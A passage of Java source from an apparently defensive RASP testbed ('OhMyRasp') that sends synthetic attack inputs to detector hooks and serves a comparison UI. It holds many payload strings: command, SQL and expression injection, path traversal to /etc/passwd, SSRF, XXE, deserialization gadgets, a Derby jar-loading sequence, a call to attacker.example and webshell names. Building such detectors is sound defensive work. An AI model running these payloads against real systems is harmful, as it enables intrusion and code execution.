                  List.of("sum:sys.cpu.nice"),
                  "ylabel",
                  List.of("1"),
                  "y2range",
                  List.of("[42:42]"),
                  "key",
                  List.of(";system \"touch /tmp/poc\" \""),
                  "wxh",
                  List.of("1516x644"),
                  "style",
                  List.of("linespoint"),
                  "grid",
                  List.of("t"),
                  "json",
                  List.of("")),
              Map.of("user-agent", "Mozilla/5.0"));
      case "request-sql-sort-injection" -> {
        String body =
            "{\"orders\":[{\"name\":\"name\",\"type\":\",if(1=1,sleep(2),0)\"}],"
                + "\"components\":[],\"filters\":{}}";
        hook(
            "beforeSyntheticHttpRequestWithBody",
            new Class<?>[] {
              String.class, String.class, String.class, Map.class, Map.class, String.class
            },
            "POST",
            "/test/case/list/1/10",
            "",
            Map.of(),
            Map.of("user-agent", "Mozilla/5.0", "content-type", "application/json"),
            body);
      }
      case "request-skywalking-graphql-sql-identifier" -> {
        hook(
            "beforeSyntheticHttpRequestWithBody",
            new Class<?>[] {
              String.class, String.class, String.class, Map.class, Map.class, String.class
            },
            "POST",
            "/graphql",
            "",
            Map.of(),
            Map.of("user-agent", "Mozilla/5.0", "content-type", "application/json"),
            skyWalkingGraphqlSqlIdentifierBody());
      }
      case "request-internal-forward" ->
          hook(
              "beforeSyntheticHttpRequest",
              new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class},
              "GET",
              "/hax",
              "jsp=/app/rest/users;.jsp",
              Map.of("jsp", List.of("/app/rest/users;.jsp")),
              Map.of("user-agent", "Mozilla/5.0"));
      case "request-path-confusion" ->
          hook(
              "beforeSyntheticHttpRequest",
              new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class},
              "GET",
              value(request, "uri", "/geo/../dataease/de2api/datasource/types"),
              "",
              Map.of(),
              Map.of("user-agent", "Mozilla/5.0"));
      case "request-spring-jetty-ghostbits-path-confusion" ->
          hook(
              "beforeSyntheticHttpRequest",
              new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class},
              "GET",
              "/阮严灵丰丰甲来/阮严灵丰丰甲来/etc/passw%64",
              "",
              Map.of(),
              Map.of("user-agent", "Mozilla/5.0"));
      case "request-spring-cve-2025-41242-ghostbits-path-traversal" ->
          hook(
              "beforeSyntheticHttpRequest",
              new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class},
              "GET",
              "/阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/etc/passw%64",
              "",
              Map.of(),
              Map.of("user-agent", "Mozilla/5.0"));
      case "request-flink-log-path-traversal" ->
          hook(
              "beforeSyntheticHttpRequest",
              new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class},
              "GET",
              "/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd",
              "",
              Map.of(),
              Map.of("user-agent", "Mozilla/5.0"));
      case "request-internal-resource" ->
          hook(
              "beforeSyntheticHttpRequest",
              new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class},
              "GET",
              value(request, "uri", "/static"),
              value(request, "query", "/%2557EB-INF/web.xml"),
              Map.of(),
              Map.of("user-agent", "Mozilla/5.0"));
      case "ssrf-userinput" ->
          hook(
              "beforeUrlOpen",
              new Class<?>[] {Object.class},
              value(request, "url", "http://127.0.0.1/admin"));
      case "ssrf-geoserver-testwfspost" ->
          hook(
              "beforeUrlOpen",
              new Class<?>[] {Object.class},
              URI.create(value(request, "url", "http://interal/geoserver/../")).toURL());
      case "ssrf-common" ->
          hook("beforeUrlOpen", new Class<?>[] {Object.class}, "http://probe.dnslog.cn/a");
      case "ssrf-protocol" ->
          hook("beforeUrlOpen", new Class<?>[] {Object.class}, "gopher://127.0.0.1:6379/_info");
      case "ssrf-obfuscate" ->
          hook("beforeUrlOpen", new Class<?>[] {Object.class}, "http://2130706433/");
      case "read-http" ->
          hook(
              "beforeFileRead",
              new Class<?>[] {String.class},
              value(request, "file", "http://127.0.0.1/internal"));
      case "read-unwanted" ->
          hook(
              "beforeFileRead",
              new Class<?>[] {String.class},
              value(request, "file", "file:///etc/passwd"));
      case "argument-file-expansion" ->
          hook(
              "beforeArgumentFileExpansion",
              new Class<?>[] {Object.class},
              (Object) argumentFileExpansionArguments(request));
      case "write-ntfs" ->
          hook("beforeFileWrite", new Class<?>[] {String.class}, "upload.txt::$DATA");
      case "write-config-path" ->
          hook(
              "beforeFileWrite",
              new Class<?>[] {String.class, List.class},
              value(request, "path", "/tmp/success"),
              List.of(
                  "org.apache.rocketmq.remoting.Configuration",
                  "org.apache.rocketmq.common.MixAll"));
      case "write-rocketmq-cve-2023-37582-config-path" ->
          hook(
              "beforeFileWrite",
              new Class<?>[] {String.class, List.class},
              value(request, "path", "/tmp/success"),
              List.of(
                  "org.apache.rocketmq.remoting.Configuration",
                  "org.apache.rocketmq.common.MixAll"));
      case "write-generated-script" -> {
        String payload = value(request, "payload", "[0:system('touch /tmp/success')]");
        hook(
            "beforeGeneratedScriptFileWrite",
            new Class<?>[] {Object.class, Object.class},
            "/tmp/opentsdb-graph.gnuplot",
            "set yrange " + payload + "\nplot '-' using 1:2");
      }
      case "write-generated-script-key" -> {
        String payload = value(request, "payload", ";system \"touch /tmp/poc\" \"");
        hook(
            "beforeGeneratedScriptFileWrite",
            new Class<?>[] {Object.class, Object.class},
            "/tmp/tsd-graph.gp",
            "set key " + payload + "\nplot '-' using 1:2");
      }
      case "remote-job-submission" ->
          hook(
              "beforeRemoteJobSubmission",
              new Class<?>[] {String.class, String.class},
              "Spark REST",
              remoteJobDescriptor());
      case "remote-hadoop-yarn-command-submission" ->
          hook(
              "beforeRemoteJobSubmission",
              new Class<?>[] {String.class, String.class},
              "YARN",
              hadoopYarnJobDescriptor());
      case "include-userinput" ->
          hook(
              "beforeInclude",
              new Class<?>[] {String.class, String.class, String.class},
              value(request, "file", "/etc/passwd"),
              value(request, "file", "/etc/passwd"),
              "include");
      case "include-protocol" ->
          hook(
              "beforeInclude",
              new Class<?>[] {String.class, String.class, String.class},
              "jar://file:/tmp/a.jar!/x",
              "",
              "include");
      case "request-forged-include-attribute" ->
          hook(
              "beforeServletIncludeAttributes",
              new Class<?>[] {Map.class, List.class},
              Map.of(
                  "javax.servlet.include.servlet_path",
                  value(request, "path", "/WEB-INF/web.xml"),
                  "javax.servlet.include.request_uri",
                  value(request, "path", "/WEB-INF/web.xml")),
              List.of("org.apache.coyote.ajp.AjpProcessor"));
      case "request-tomcat-cve-2020-1938-ajp-include" ->
          hook(
              "beforeSyntheticServletIncludeAttributes",
              new Class<?>[] {
                String.class, String.class, String.class, Map.class, Map.class, Map.class, List.class
              },
              "GET",
              "/asdf",
              "",
              Map.of(),
              Map.of("user-agent", "Mozilla"),
              Map.of(
                  "javax.servlet.include.request_uri",
                  "/",
                  "javax.servlet.include.path_info",
                  value(request, "file", "WEB-INF/web.xml"),
                  "javax.servlet.include.servlet_path",
                  "/"),
              List.of("org.apache.coyote.ajp.AjpProcessor"));
      case "directory-reflect" ->
          hook("beforeDirectoryList", new Class<?>[] {Object.class}, "/tmp");
      case "xxe-protocol" ->
          hook(
              "beforeXmlEntity",
              new Class<?>[] {String.class, Object.class},
              "xxe",
              "http://example.com/evil.dtd");
      case "xxe-file" ->
          hook("beforeXxeFileRead", new Class<?>[] {String.class}, "/etc/passwd");
      case "xml-attachment" ->
          hook(
              "beforeXmlAttachmentReference",
              new Class<?>[] {String.class, String.class},
              "cxf-aegis-xop",
              value(request, "href", "file:///etc/hosts"));
      case "upload-script" ->
          hook("beforeFileUpload", new Class<?>[] {String.class}, "shell.jsp");
      case "upload-expression-filename" ->
          hook(
              "beforeFileUpload",
              new Class<?>[] {String.class},
              "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse']"
                  + ".addHeader('X-Test',233*233)}\u0000b");
      case "upload-traversal" ->
          hook(
              "beforeFileUpload",
              new Class<?>[] {String.class},
              value(request, "filename", "../../../../../../tmp/success"));
      case "upload-html" ->
          hook("beforeFileUpload", new Class<?>[] {String.class}, "phish.html");
      case "upload-exe" ->
          hook("beforeFileUpload", new Class<?>[] {String.class}, "dropper.exe");
      case "plugin-upload" ->
          hook("beforeFileUpload", new Class<?>[] {String.class}, "Evil.jar");
      case "webdav" ->
          hook(
              "beforeWebdavUpload",
              new Class<?>[] {String.class, String.class, String.class},
              "avatar.jpg",
              "shell.jsp",
              "MOVE");
      case "webdav-unsafe-destination" ->
          hook(
              "beforeWebdavUpload",
              new Class<?>[] {String.class, String.class, String.class},
              "/fileserver/1.txt",
              "file:///etc/cron.d/root",
              "MOVE");
      case "rename" ->
          hook("beforeRename", new Class<?>[] {String.class, String.class}, "avatar.jpg", "shell.jsp");
      case "link" ->
          hook(
              "beforeLink",
              new Class<?>[] {String.class, String.class, String.class},
              "avatar.jpg",
              "shell.jsp",
              "hard");
      case "deserialization-gadget" ->
          hook(
              "beforeDeserializationClass",
              new Class<?>[] {String.class},
              value(request, "class", "bsh.XThis"));
      case "deserialization-cluster-message" ->
          hook(
              "beforeSyntheticDeserializationClass",
              new Class<?>[] {String.class, List.class},
              "org.apache.commons.collections.functors.InvokerTransformer",
              List.of(
                  "org.apache.catalina.tribes.group.interceptors.EncryptInterceptor",
                  "org.apache.catalina.tribes.io.XByteBuffer",
                  "org.apache.catalina.tribes.transport.nio.NioReplicationTask"));
      case "deserialization-logging-message" ->
          hook(
              "beforeSyntheticDeserializationClass",
              new Class<?>[] {String.class, List.class},
              "org.apache.commons.collections.functors.InvokerTransformer",
              List.of(
                  "org.apache.logging.log4j.core.net.server.ObjectInputStreamLogEventBridge",
                  "org.apache.logging.log4j.core.net.server.TcpSocketServer",
                  "org.apache.logging.log4j.core.net.server.AbstractSocketServer"));
      case "deserialization-webflow-state" ->
          hook(
              "beforeSyntheticDeserializationClass",
              new Class<?>[] {String.class, List.class},
              "org.apache.commons.collections4.functors.InvokerTransformer",
              List.of(
                  "org.jasig.cas.util.EncryptedTranscoder",
                  "org.springframework.webflow.execution.repository.support.ClientFlowExecutionRepository",
                  "org.springframework.webflow.execution.repository.snapshot.SerializedFlowExecutionSnapshot",
                  "java.io.ObjectInputStream"));
      case "deserialization-rmi-transport" ->
          hook(
              "beforeSyntheticDeserializationClass",
              new Class<?>[] {String.class, List.class},
              "bsh.XThis",
              List.of(
                  "sun.rmi.server.UnicastServerRef",
                  "sun.rmi.transport.Transport",
                  "sun.rmi.transport.tcp.TCPTransport",
                  "org.apache.jmeter.engine.RemoteJMeterEngineImpl"));
      case "deserialization-remoting-transport" ->
          hook(
              "beforeSyntheticDeserializationClass",
              new Class<?>[] {String.class, List.class},
              "sun.rmi.server.UnicastRef",
              List.of(
                  "weblogic.rjvm.InboundMsgAbbrev",
                  "weblogic.rjvm.MsgAbbrevInputStream",
                  "weblogic.protocol.ServerChannelInputStream",
                  "weblogic.socket.SocketMuxer"));
      case "deserialization-weblogic-cve-2018-2628-t3-jrmpclient" ->
          hook(
              "beforeSyntheticDeserializationClass",
              new Class<?>[] {String.class, List.class},
              "sun.rmi.server.UnicastRef",
              List.of(
                  "weblogic.rjvm.InboundMsgAbbrev",
                  "weblogic.rjvm.MsgAbbrevInputStream",
                  "weblogic.protocol.ServerChannelInputStream",
                  "weblogic.socket.SocketMuxer"));
      case "deserialization-weblogic-cve-2023-21839-iiop-jndi" ->
          hook(
              "beforeSyntheticDeserializationClass",
              new Class<?>[] {String.class, List.class},
              "com.sun.rowset.JdbcRowSetImpl",
              List.of(
                  "weblogic.iiop.IIOPInputStream",
                  "weblogic.iiop.ServerIIOPConnection",
                  "weblogic.rmi.internal.BasicServerRef"));
      case "deserialization-jms-object-message" ->
          hook(
              "beforeSyntheticDeserializationClass",
              new Class<?>[] {String.class, List.class},
              "com.rometools.rome.feed.impl.ToStringBean",
              List.of(
                  "org.apache.activemq.command.ActiveMQObjectMessage",
                  "org.apache.activemq.util.ClassLoadingAwareObjectInputStream",
                  "java.io.ObjectInputStream",
                  "org.apache.activemq.web.MessageServletSupport"));
      case "deserialization-signed-object" ->
          hook(
              "beforeSyntheticDeserializationClass",
              new Class<?>[] {String.class, List.class},
              "java.security.SignedObject",
              List.of(
                  "hudson.cli.CLICommand",
                  "hudson.cli.CliManagerImpl",
                  "hudson.remoting.ObjectInputStreamEx",
                  "java.io.ObjectInputStream"));
      case "deserialization-session-file" ->
          hook(
              "beforeSessionDeserialization",
              new Class<?>[] {String.class, String.class},
              value(request, "id", ".deserialize"),
              "TomcatFileStore");
      case "deserialization-protocol-class" ->
          hook(
              "beforeProtocolClassInstantiation",
              new Class<?>[] {String.class, String.class, Object.class},
              "OpenWire",
              value(
                  request,
                  "class",
                  "org.springframework.context.support.ClassPathXmlApplicationContext"),
              value(request, "xml", "http://attacker.example/poc.xml"));
      case "deserialization-http-invoker" ->
          hook(
              "beforeHttpInvokerDeserialization",
              new Class<?>[] {String.class},
              "SpringHttpInvoker");
      case "deserialization-http-object-stream" ->
          hook(
              "beforeObjectInputStream",
              new Class<?>[] {Object.class},
              new PlaygroundServletInputStream());
      case "deserialization-hessian-type" ->
          hook(
              "beforeHessianType",
              new Class<?>[] {String.class},
              value(request, "class", "org.apache.commons.beanutils.BeanComparator"));
      case "deserialization-xmlrpc-serialized" ->
          hook(
              "beforeXmlRpcSerializableValue",
              new Class<?>[] {String.class},
              "ApacheXmlRpc");
      case "deserialization-rmi-registry-bind" ->
          hook(
              "beforeRmiRegistryBind",
              new Class<?>[] {String.class, String.class, Object.class, List.class},
              "bind",
              "pwn",
              remoteProxy(),
              rmiRegistryStack());
      case "deserialization-rmi-registry-bind-bypass" ->
          hook(
              "beforeSyntheticRmiRegistryBind",
              new Class<?>[] {String.class, String.class, String.class, List.class},
              "rebind",
              "pwn",
              "sun.rmi.server.UnicastRef",
              rmiRegistryStack());
      case "ognl" ->
          hook(
              "beforeOgnl",
              new Class<?>[] {String.class},
              "@java.lang.Runtime@getRuntime().exec('id')");
      case "ognl-length" ->
          hook("beforeOgnl", new Class<?>[] {String.class}, "a".repeat(401));
      case "spel" ->
          hook(
              "beforeExpressionEvaluation",
              new Class<?>[] {String.class, Object.class},
              "spel",
              value(request, "expr", "T(java.lang.Runtime).getRuntime().exec('id')"));
      case "script-command-stack" ->
          hook(
              "beforeProcessBuilderStart",
              new Class<?>[] {ProcessBuilder.class, List.class},
              new ProcessBuilder(value(request, "cmd", "id")),
              List.of("org.codehaus.groovy.runtime.ProcessGroovyMethods"));
      case "command-config-listener" ->
          hook(
              "beforeProcessBuilderStart",
              new Class<?>[] {ProcessBuilder.class, List.class},
              new ProcessBuilder("sh", "-c", value(request, "cmd", "touch /tmp/success")),
              List.of("org.apache.solr.core.RunExecutableListener"));
      case "command-solr-cve-2017-12629-runexecutable" ->
          hook(
              "beforeProcessBuilderStart",
              new Class<?>[] {ProcessBuilder.class, List.class},
              new ProcessBuilder("sh", "-c", value(request, "cmd", "touch /tmp/success")),
              List.of("org.apache.solr.core.RunExecutableListener"));
      case "command-config-injection" ->
          hook(
              "beforeProcessBuilderStart",
              new Class<?>[] {ProcessBuilder.class, List.class},
              new ProcessBuilder("sh", "-c", value(request, "cmd", "touch /tmp/success")),
              List.of(
                  "org.apache.rocketmq.broker.filtersrv.FilterServerManager",
                  "org.apache.rocketmq.broker.filtersrv.FilterServerUtil"));
      case "command-rocketmq-cve-2023-33246-filterserver" ->
          hook(
              "beforeProcessBuilderStart",
              new Class<?>[] {ProcessBuilder.class, List.class},
              new ProcessBuilder("sh", "-c", value(request, "cmd", "touch /tmp/success")),
              List.of(
                  "org.apache.rocketmq.broker.filtersrv.FilterServerManager",
                  "org.apache.rocketmq.broker.filtersrv.FilterServerUtil"));
      case "javascript-runtime" ->
          hook(
              "beforeExpressionEvaluation",
              new Class<?>[] {String.class, Object.class},
              "javascript",
              value(
                  request,
                  "expr",
                  "function(){return java.lang.Runtime.getRuntime().exec(['sh','-c','id']);}"));
      case "jiffle-runtime" ->
          hook(
              "beforeExpressionEvaluation",
              new Class<?>[] {String.class, Object.class},
              "jiffle",
              value(request, "script", geoserverJifflePayload()));
      case "jexl-runtime" ->
          hook(
              "beforeExpressionEvaluation",
              new Class<?>[] {String.class, Object.class},
              "jexl",
              value(
                  request,
                  "expr",
                  "233.class.forName('java.lang.Runtime').getRuntime().exec('touch /tmp/success')"));
      case "el-runtime" ->
          hook(
              "beforeExpressionEvaluation",
              new Class<?>[] {String.class, Object.class},
              "el",
              value(
                  request,
                  "expr",
                  "${''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('id')}"));
      case "eval" ->
          hook("beforeEval", new Class<?>[] {String.class, String.class}, "eval", "base64_decode($x)");
      case "loadlib" ->
          hook(
              "beforeLoadLibrary",
              new Class<?>[] {String.class, String.class, boolean.class},
              "System.load",
              "\\\\server\\share\\evil.dll",
              true);
      case "response" ->
          hook(
              "beforeResponseDataLeak",
              new Class<?>[] {String.class, String.class},
              "application/json",
              "{\"phone\":\"13800138000\"}");
      case "xss-echo" ->
          hook(
              "beforeXssEcho",
              new Class<?>[] {String.class},
              "hello " + value(request, "q", "<script>alert(1)</script>"));
      case "webshell-eval" ->
          hook(
              "beforeWebshellEval",
              new Class<?>[] {String.class, String.class},
              "assert",
              value(request, "code", "system('id')"));
      case "webshell-command" ->
          hook(
              "beforeWebshellCommand",
              new Class<?>[] {String.class},
              value(request, "cmd", "sh -c id"));
      case "webshell-file" ->
          hook(
              "beforeWebshellFileWrite",
              new Class<?>[] {String.class, String.class},
              value(request, "file", "shell.jsp"),
              value(request, "content", "<% out.println(1); %>"));
      case "webshell-callable" ->
          hook("beforeWebshellCallable", new Class<?>[] {String.class}, "system");
      case "webshell-ld" ->
          hook(
              "beforeWebshellLdPreload",
              new Class<?>[] {String.class, String.class},
              "LD_PRELOAD",
              "/tmp/evil.so");
      default -> throw new IllegalArgumentException("unknown policy: " + policy);
    }
    return "policy " + policy + " triggered";
  }

  private static String derbyCodeLoadingSql() {
    return """
        CALL SYSCS_UTIL.SYSCS_EXPORT_QUERY_LOBS_TO_EXTFILE('values cast(X''504b0304'' as blob)', '/tmp/payload', ',', '"', 'UTF-8', '/tmp/payload.jar')
        CALL SQLJ.INSTALL_JAR('/tmp/payload.jar', 'NACOS.PAYLOAD', 0)
        CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY('derby.database.classpath', 'NACOS.PAYLOAD')
        CREATE FUNCTION S_EXAMPLE(PARAM VARCHAR(2000)) RETURNS VARCHAR(2000)
          PARAMETER STYLE JAVA NO SQL LANGUAGE JAVA EXTERNAL NAME 'Exec.exec'
        """;
  }

  private static void hook(String name, Class<?>[] parameterTypes, Object... args) throws Exception {
    try {
      Class<?> hooks = Class.forName("io.ohmyrasp.agent.hook.OhMyRaspHooks");
      hooks.getMethod(name, parameterTypes).invoke(null, args);
    } catch (ClassNotFoundException noAgent) {
      return;
    } catch (InvocationTargetException e) {
      Throwable cause = e.getCause();
      if (isOhMyRaspBlock(cause) && cause instanceof RuntimeException runtimeException) {
        throw runtimeException;
      }
      if (cause instanceof Exception exception) {
        throw exception;
      }
      if (cause instanceof Error error) {
        throw error;
      }
      throw e;
    }
  }

  private static boolean enterAgentRequest(HttpServletRequest request, HttpServletResponse response)
      throws Exception {
    try {
      Class<?> hooks = Class.forName("io.ohmyrasp.agent.hook.OhMyRaspHooks");
      hooks
          .getMethod("enterHttpRequest", Object.class, Object.class)
          .invoke(null, request, response);
      return true;
    } catch (ClassNotFoundException noAgent) {
      return false;
    } catch (InvocationTargetException e) {
      Throwable cause = e.getCause();
      if (isOhMyRaspBlock(cause) && cause instanceof RuntimeException runtimeException) {
        throw runtimeException;
      }
      if (cause instanceof Exception exception) {
        throw exception;
      }
      if (cause instanceof Error error) {
        throw error;
      }
      throw e;
    }
  }

  private static void exitAgentRequest() {
    try {
      hook("exitHttpRequest", new Class<?>[] {});
    } catch (Exception ignored) {
      // Request teardown should never mask the playground response.
    }
  }

  private static boolean isOhMyRaspBlock(Throwable throwable) {
    Throwable current = throwable;
    while (current != null) {
      if (current.getClass().getName().equals("io.ohmyrasp.agent.hook.OhMyRaspBlockException")) {
        return true;
      }
      current = current.getCause();
    }
    return false;
  }

  private static String renderBlocked(HttpServletRequest request) {
    return """
        <!doctype html>
        <html lang="en">
        <head>
          <meta charset="utf-8">
          <meta name="viewport" content="width=device-width, initial-scale=1">
          <title>OhMyRasp Intercepted</title>
          <style>
            body{margin:0;font-family:Arial,Helvetica,sans-serif;background:#111827;color:#f9fafb}
            main{max-width:860px;margin:0 auto;padding:48px 24px}
            .panel{border:1px solid #374151;background:#1f2937;border-radius:8px;padding:24px}
            h1{margin:0 0 12px;font-size:28px;letter-spacing:0}
            dl{display:grid;grid-template-columns:120px 1fr;gap:10px 16px;margin:24px 0 0}
            dt{color:#9ca3af}dd{margin:0;overflow-wrap:anywhere}
            a{color:#93c5fd}
          </style>
        </head>
        <body>
          <main>
            <section class="panel">
              <h1>Request intercepted</h1>
              <p>OhMyRasp redirected this request after a detector matched.</p>
              <dl>
                <dt>Hook</dt><dd>%s</dd>
                <dt>Algorithm</dt><dd>%s</dd>
                <dt>Message</dt><dd>%s</dd>
              </dl>
              <p><a href="/rasp/ui">Back to testbed</a></p>
            </section>
          </main>
        </body>
        </html>
        """
        .formatted(
            html(value(request, "hook", "")),
            html(value(request, "algorithm", "")),
            html(value(request, "message", "")));
  }

  private static String renderUi(HttpServletRequest request) {
    return """
        <!doctype html>
        <html lang="en">
        <head>
          <meta charset="utf-8">
          <meta name="viewport" content="width=device-width, initial-scale=1">
          <title>OhMyRasp Testbed</title>
          <style>
            :root{color-scheme:light;--ink:#172033;--muted:#5d667a;--line:#d8dde8;--bg:#f5f7fb;--panel:#fff;--base:#2563eb;--prot:#b42318;--accent:#6d28d9}
            *{box-sizing:border-box}body{margin:0;font-family:Arial,Helvetica,sans-serif;background:var(--bg);color:var(--ink)}
            header{background:#0f172a;color:#fff;padding:18px 24px;border-bottom:4px solid #2dd4bf}
            header h1{margin:0;font-size:24px;letter-spacing:0}header p{margin:6px 0 0;color:#cbd5e1}
            main{padding:18px 24px;max-width:1440px;margin:0 auto}
            .toolbar{display:flex;flex-wrap:wrap;gap:10px;align-items:center;margin-bottom:16px}
            .toolbar code,.toolbar select{background:#e8edf6;border:1px solid var(--line);border-radius:6px;padding:7px 9px}
            .grid{display:grid;grid-template-columns:minmax(520px,1.1fr) minmax(420px,.9fr);gap:16px}
            table{width:100%%;border-collapse:collapse;background:var(--panel);border:1px solid var(--line);border-radius:8px;overflow:hidden}
            th,td{border-bottom:1px solid var(--line);padding:10px;text-align:left;vertical-align:middle;font-size:14px}
            th{background:#eef2f8;color:#334155;font-size:12px;text-transform:uppercase;letter-spacing:.04em}
            tr:last-child td{border-bottom:0}.category{color:var(--muted);font-size:12px}
            button{border:1px solid transparent;border-radius:6px;padding:8px 10px;color:#fff;cursor:pointer;min-width:96px}
            button.base{background:var(--base)}button.protected{background:var(--prot)}button.all{background:#0f766e}button.env{background:var(--accent)}
            button:disabled{opacity:.5;cursor:wait}
            .labs{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:10px;margin:0 0 16px}
            .lab{background:var(--panel);border:1px solid var(--line);border-radius:8px;padding:12px}
            .lab h2{font-size:15px;margin:0 0 6px}.lab p{font-size:13px;color:var(--muted);margin:0 0 8px}.lab code{font-size:12px}
            .result{background:var(--panel);border:1px solid var(--line);border-radius:8px;min-height:520px;padding:14px}
            .result h2{margin:0 0 12px;font-size:18px}.entry{border-top:1px solid var(--line);padding:10px 0}
            .entry:first-of-type{border-top:0}.tag{display:inline-block;border-radius:999px;padding:2px 8px;font-size:12px;color:#fff}
            .tag.baseline{background:var(--base)}.tag.protected{background:var(--prot)}
            pre{white-space:pre-wrap;overflow-wrap:anywhere;background:#0b1220;color:#d1e7ff;border-radius:6px;padding:10px;max-height:160px;overflow:auto}
            @media(max-width:980px){.grid{grid-template-columns:1fr}main{padding:14px}th:nth-child(2),td:nth-child(2){display:none}}
          </style>
        </head>
        <body>
          <header>
            <h1>OhMyRasp Comparative Testbed</h1>
            <p>Tomcat 9, 10, and 11 run as paired baseline and protected environments.</p>
          </header>
          <main>
            <div class="toolbar">
              <select id="environmentSelect"></select>
              <code id="environmentUrl"></code>
              <button class="env" id="runSelected">Run selected environment</button>
              <button class="base" id="runBaselines">Run all baselines</button>
              <button class="all" id="runProtected">Run all protected</button>
            </div>
            <section class="labs" id="labs"></section>
            <div class="grid">
              <table>
                <thead><tr><th>Case</th><th>Endpoint</th><th>Run</th></tr></thead>
                <tbody id="cases"></tbody>
              </table>
              <section class="result">
                <h2>Results</h2>
                <div id="results"></div>
              </section>
            </div>
          </main>
          <script>
            const cases = %s;
            const environments = %s;
            const labCatalog = %s;
            const host = location.hostname || 'localhost';
            for (const env of environments) {
              env.base = `${location.protocol}//${host}:${env.port}`;
              const option = document.createElement('option');
              option.value = env.id;
              option.textContent = env.label;
              environmentSelect.appendChild(option);
            }
            function selectedEnvironment() {
              return environments.find(env => env.id === environmentSelect.value) || environments[0];
            }
            function updateEnvironmentUrl() {
              const env = selectedEnvironment();
              environmentUrl.textContent = `${env.kind}: ${env.base}`;
            }
            environmentSelect.onchange = updateEnvironmentUrl;
            updateEnvironmentUrl();
            const labsContainer = document.getElementById('labs');
            for (const group of labCatalog.groups || []) {
              const article = document.createElement('article');
              article.className = 'lab';
              article.innerHTML = `<h2>${escapeHtml(group.label)}</h2><p>${escapeHtml((group.mechanics || []).join(' / '))}</p><code>${(group.labs || []).map(lab => escapeHtml(lab.name)).join(', ')}</code>`;
              labsContainer.appendChild(article);
            }
            const tbody = document.getElementById('cases');
            for (const item of cases) {
              const tr = document.createElement('tr');
              tr.innerHTML = `<td><strong>${item.name}</strong><div class="category">${item.category}</div></td><td><code>${item.path}</code></td><td><button class="env">Run selected</button></td>`;
              tr.querySelector('.env').onclick = () => runCase(item, selectedEnvironment());
              tbody.appendChild(tr);
            }
            runSelected.onclick = () => runSet([selectedEnvironment()], runSelected);
            runBaselines.onclick = () => runSet(environments.filter(env => env.kind === 'baseline'), runBaselines);
            runProtected.onclick = () => runSet(environments.filter(env => env.kind === 'protected'), runProtected);
            async function runSet(selected, button) {
              button.disabled = true;
              for (const env of selected) {
                for (const item of cases) await runCase(item, env);
              }
              button.disabled = false;
            }
            async function runCase(item, env) {
              const started = performance.now();
              let status = 'error', finalUrl = '', body = '';
              try {
                const response = await fetch(env.base + item.path, {redirect:'follow'});
                status = String(response.status);
                finalUrl = response.url;
                body = await response.text();
              } catch (error) {
                body = String(error);
              }
              const elapsed = Math.round(performance.now() - started);
              const entry = document.createElement('div');
              entry.className = 'entry';
              entry.innerHTML = `<span class="tag ${env.kind}">${env.label}</span> <strong>${item.name}</strong> <span>${status} / ${elapsed}ms</span><div><small>${finalUrl}</small></div><pre>${escapeHtml(body.slice(0, 1200))}</pre>`;
              results.prepend(entry);
            }
            function escapeHtml(value) {
              return value.replace(/[&<>"']/g, ch => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[ch]));
            }
          </script>
        </body>
        </html>
        """
        .formatted(testCasesJson(), environmentsJson(), LabCatalog.json());
  }

  private static String testCasesJson() {
    return """
        [
          {"category":"request","name":"Scanner user agent","path":"/rasp/policy/request-scanner"},
          {"category":"request","name":"Missing User-Agent","path":"/rasp/policy/request-unusual"},
          {"category":"request","name":"XSS parameter","path":"/rasp/request?q=%3Cscript%3Ealert(1)%3C/script%3E"},
          {"category":"request","name":"Java bean classloader binding","path":"/rasp/request?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di"},
          {"category":"request","name":"Internal service identity on control path","path":"/rasp/policy/request-internal-identity"},
          {"category":"request","name":"JWT signed with default secret","path":"/rasp/policy/request-default-jwt-secret"},
          {"category":"request","name":"JWT verification failure","path":"/rasp/policy/request-jwt-verification-failure"},
          {"category":"request","name":"Encrypted cookie with default key","path":"/rasp/policy/request-default-crypto-cookie"},
          {"category":"request","name":"Serialized client state","path":"/rasp/policy/request-serialized-client-state"},
          {"category":"request","name":"Default administrative credential","path":"/rasp/policy/request-default-credential"},
          {"category":"request","name":"Empty credential bypass flag","path":"/rasp/policy/request-empty-credential-bypass"},
          {"category":"request","name":"Setup state reset binding","path":"/rasp/policy/request-setup-state-reset"},
          {"category":"request","name":"Server-side script PUT path","path":"/rasp/policy/request-server-side-script-put"},
          {"category":"request","name":"Upload filename override traversal","path":"/rasp/policy/request-upload-filename-override"},
          {"category":"request","name":"Scheduler shell job dispatch","path":"/rasp/policy/request-scheduler-shell-job"},
          {"category":"request","name":"Debug process launch","path":"/rasp/policy/request-debug-process-launch"},
          {"category":"request","name":"Dynamic script configuration","path":"/rasp/policy/request-dynamic-script-config"},
          {"category":"request","name":"Solr DataImport script configuration","path":"/rasp/policy/request-solr-cve-2019-0193-dataimport-script"},
          {"category":"request","name":"STOMP selector expression","path":"/rasp/policy/request-spring-messaging-stomp-selector"},
          {"category":"request","name":"Druid sampler JavaScript","path":"/rasp/policy/request-druid-javascript-sampler"},
          {"category":"request","name":"Druid Kafka JAAS sampler","path":"/druid/indexer/v1/sampler?for=connect"},
          {"category":"request","name":"Gremlin Groovy script submission","path":"/rasp/policy/request-hugegraph-gremlin-script"},
          {"category":"request","name":"HugeGraph Gremlin API script submission","path":"/gremlin"},
          {"category":"request","name":"OFBiz Groovy ProgramExport","path":"/rasp/policy/request-ofbiz-groovy-programexport"},
          {"category":"request","name":"OFBiz remote decorator source","path":"/rasp/policy/request-ofbiz-remote-decorator-source"},
